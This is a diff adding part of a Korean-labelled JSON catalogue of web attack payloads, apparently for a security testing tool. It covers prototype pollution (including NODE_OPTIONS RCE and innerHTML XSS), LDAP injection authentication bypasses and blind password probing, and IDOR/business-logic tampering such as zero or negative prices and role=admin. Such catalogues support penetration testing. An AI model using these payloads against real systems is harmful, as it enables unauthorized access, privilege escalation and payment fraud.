+          "id": "proto_02",
+          "name": "constructor 오염",
+          "payload": "{\"constructor\":{\"prototype\":{\"admin\":true}}}",
+          "description": "constructor.prototype 오염",
+          "risk": "high"
+        },
+        {
+          "id": "proto_03",
+          "name": "URL 파라미터 오염",
+          "payload": "__proto__[admin]=true",
+          "description": "쿼리스트링 오염",
+          "risk": "high"
+        },
+        {
+          "id": "proto_04",
+          "name": "NODE_OPTIONS RCE",
+          "payload": "{\"__proto__\":{\"NODE_OPTIONS\":\"--require /proc/self/environ\"}}",
+          "description": "NODE_OPTIONS RCE",
+          "risk": "critical"
+        },
+        {
+          "id": "proto_05",
+          "name": "XSS via innerHTML",
+          "payload": "{\"__proto__\":{\"innerHTML\":\"<img src=x onerror=alert(1)>\"}}",
+          "description": "innerHTML 오염 XSS",
+          "risk": "high"
+        },
+        {
+          "id": "proto_06",
+          "name": "중첩 오염",
+          "payload": "{\"a\":{\"__proto__\":{\"admin\":true}}}",
+          "description": "중첩 객체 오염",
+          "risk": "high"
+        },
+        {
+          "id": "proto_07",
+          "name": "__proto__ 쿼리",
+          "payload": "?__proto__[admin]=true",
+          "description": "쿼리 파라미터 오염",
+          "risk": "high",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution"
+        },
+        {
+          "id": "proto_08",
+          "name": "constructor.prototype",
+          "payload": "?constructor[prototype][admin]=true",
+          "description": "constructor 경유",
+          "risk": "high",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution"
+        },
+        {
+          "id": "proto_09",
+          "name": "JSON body __proto__",
+          "payload": "{\"__proto__\":{\"isAdmin\":true}}",
+          "description": "JSON 병합 오염",
+          "risk": "high",
+          "reference": "https://portswigger.net/web-security/prototype-pollution"
+        },
+        {
+          "id": "proto_10",
+          "name": "JSON constructor",
+          "payload": "{\"constructor\":{\"prototype\":{\"isAdmin\":true}}}",
+          "description": "constructor 경유 JSON",
+          "risk": "high",
+          "reference": "https://portswigger.net/web-security/prototype-pollution"
+        },
+        {
+          "id": "proto_11",
+          "name": "가젯 RCE(child_process)",
+          "payload": "{\"__proto__\":{\"argv0\":\"...\",\"shell\":\"...\"}}",
+          "description": "가젯 결합 RCE 유도",
+          "risk": "critical",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution"
+        },
+        {
+          "id": "proto_12",
+          "name": "클라이언트측 오염",
+          "payload": "?__proto__[innerHTML]=<img src onerror=alert(1)>",
+          "description": "클라이언트 프로토타입→XSS",
+          "risk": "high",
+          "reference": "https://portswigger.net/web-security/prototype-pollution/client-side"
+        }
+      ]
+    },
+    {
+      "id": "ldap",
+      "name": "LDAP Injection",
+      "icon": "🗂",
+      "color": "#2980b9",
+      "payloads": [
+        {
+          "id": "ldap_01",
+          "name": "기본 인증 우회",
+          "payload": "*)(&",
+          "description": "LDAP 필터 인증 우회",
+          "risk": "critical"
+        },
+        {
+          "id": "ldap_02",
+          "name": "와일드카드 우회",
+          "payload": "*)(uid=*))(|(uid=*",
+          "description": "와일드카드 인증 우회",
+          "risk": "critical"
+        },
+        {
+          "id": "ldap_03",
+          "name": "Null 우회",
+          "payload": "\\00",
+          "description": "Null 바이트 인젝션",
+          "risk": "high"
+        },
+        {
+          "id": "ldap_04",
+          "name": "전체 오브젝트 탐색",
+          "payload": "*(|(objectClass=*))",
+          "description": "전체 LDAP 오브젝트",
+          "risk": "high"
+        },
+        {
+          "id": "ldap_05",
+          "name": "이메일 탐색",
+          "payload": "*(|(mail=*))",
+          "description": "이메일 속성 탐색",
+          "risk": "medium"
+        },
+        {
+          "id": "ldap_06",
+          "name": "Blind LDAP",
+          "payload": "admin)(|(password=a*",
+          "description": "Blind LDAP 패스워드",
+          "risk": "high"
+        },
+        {
+          "id": "ldap_07",
+          "name": "항상 참",
+          "payload": "*)(|(objectClass=*",
+          "description": "objectClass 매칭",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection"
+        },
+        {
+          "id": "ldap_08",
+          "name": "admin 우회",
+          "payload": "admin)(|(password=*",
+          "description": "패스워드 조건 무력화",
+          "risk": "high",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/ldap-injection"
+        },
+        {
+          "id": "ldap_09",
+          "name": "블라인드 문자 탐색",
+          "payload": "admin*)(userPassword=a*",
+          "description": "속성 값 이진 탐색",
+          "risk": "high",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/ldap-injection"
+        },
+        {
+          "id": "ldap_10",
+          "name": "널 삽입",
+          "payload": "*)(uid=*))%00",
+          "description": "널바이트 절단",
+          "risk": "medium",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection"
+        },
+        {
+          "id": "ldap_11",
+          "name": "AND 우회",
+          "payload": "*)(&(uid=*",
+          "description": "AND 필터 조작",
+          "risk": "medium",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection"
+        }
+      ]
+    },
+    {
+      "id": "business",
+      "name": "비즈니스 로직 / IDOR",
+      "icon": "🏢",
+      "color": "#95a5a6",
+      "payloads": [
+        {
+          "id": "biz_01",
+          "name": "IDOR ID 변경",
+          "payload": "id=1",
+          "description": "다른 사용자 ID 변경",
+          "risk": "high"
+        },
+        {
+          "id": "biz_02",
+          "name": "IDOR 음수 ID",
+          "payload": "id=-1",
+          "description": "음수 ID 접근",
+          "risk": "medium"
+        },
+        {
+          "id": "biz_03",
+          "name": "IDOR UUID",
+          "payload": "id=00000000-0000-0000-0000-000000000001",
+          "description": "순차 UUID 추측",
+          "risk": "medium"
+        },
+        {
+          "id": "biz_04",
+          "name": "가격 0원",
+          "payload": "price=0",
+          "description": "가격 파라미터 0원",
+          "risk": "high"
+        },
+        {
+          "id": "biz_05",
+          "name": "가격 음수",
+          "payload": "price=-100",
+          "description": "음수 가격 환불 유발",
+          "risk": "high"
+        },
+        {
+          "id": "biz_06",
+          "name": "수량 음수",
+          "payload": "quantity=-1",
+          "description": "음수 수량 오버플로우",
+          "risk": "high"
+        },
+        {
+          "id": "biz_07",
+          "name": "Role admin",
+          "payload": "role=admin",
+          "description": "권한 직접 변경",
+          "risk": "critical"
+        },
+        {
+          "id": "biz_08",
+          "name": "Status 조작",
+          "payload": "status=approved",
+          "description": "결재 상태 변경",
+          "risk": "high"
+        },
+        {
+          "id": "biz_09",
+          "name": "Step Bypass",
+          "payload": "step=3",
+          "description": "다단계 단계 건너뜀",
+          "risk": "high"
+        },
+        {
+          "id": "biz_10",
+          "name": "계정 연결 탈취",
+          "payload": "account_id=victim@example.com",
+          "description": "타인 계정 연결",
+          "risk": "critical"
+        },
+        {
+          "id": "biz_11",
+          "name": "IDOR 순차 ID",
+          "payload": "/api/user/1001 -> 1002",
+          "description": "인접 객체 접근",
+          "risk": "high",
+          "reference": "https://owasp.org/www-project-web-security-testing-guide/"
+        },
+        {
+          "id": "biz_12",
+          "name": "IDOR UUID 교체",
+          "payload": "/api/order/{다른 UUID}",
+          "description": "타 사용자 자원 접근",
+          "risk": "high",
+          "reference": "https://owasp.org/www-project-web-security-testing-guide/"
+        },
+        {
+          "id": "biz_13",
+          "name": "메서드 변경 우회",
+          "payload": "GET /admin -> POST /admin",
+          "description": "메서드 기반 접근제어 우회",
+          "risk": "medium",
+          "reference": "https://portswigger.net/web-security/access-control"
+        },
+        {
+          "id": "biz_14",
+          "name": "파라미터 조작 가격",
+          "payload": "price=0 또는 price=-1",
+          "description": "결제 로직 조작",
+          "risk": "high",
+          "reference": "https://owasp.org/www-project-web-security-testing-guide/"
+        },
+        {
+          "id": "biz_15",
+          "name": "역할 파라미터 주입",
+          "payload": "role=admin / isAdmin=true",
+          "description": "권한 상승 파라미터",
+          "risk": "high",
+          "reference": "https://portswigger.net/web-security/access-control"
+        },
+        {
+          "id": "biz_16",
+          "name": "단계 건너뛰기",
+          "payload": "결제/검증 단계 직접 호출",
+          "description": "워크플로우 우회",
+          "risk": "medium",
+          "reference": "https://owasp.org/www-project-web-security-testing-guide/"
+        },
+        {
+          "id": "biz_17",
+          "name": "경쟁 상태",
+          "payload": "동시 요청으로 한도 우회",
+          "description": "race condition",
+          "risk": "high",
+          "reference": "https://portswigger.net/web-security/race-conditions"
+        },
+        {
+          "id": "biz_18",
+          "name": "대량 할당",
+          "payload": "{\"isAdmin\":true} 추가 필드",
+          "description": "mass assignment",
+          "risk": "high",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/parameter-pollution"
+        },
+        {
+          "id": "biz_19",
+          "name": "쿠폰 재사용",
+          "payload": "동일 쿠폰 반복 적용",
+          "description": "할인 로직 악용",
+          "risk": "medium",
+          "reference": "https://owasp.org/www-project-web-security-testing-guide/"
+        }
+      ]
+    }
+  ]
+}
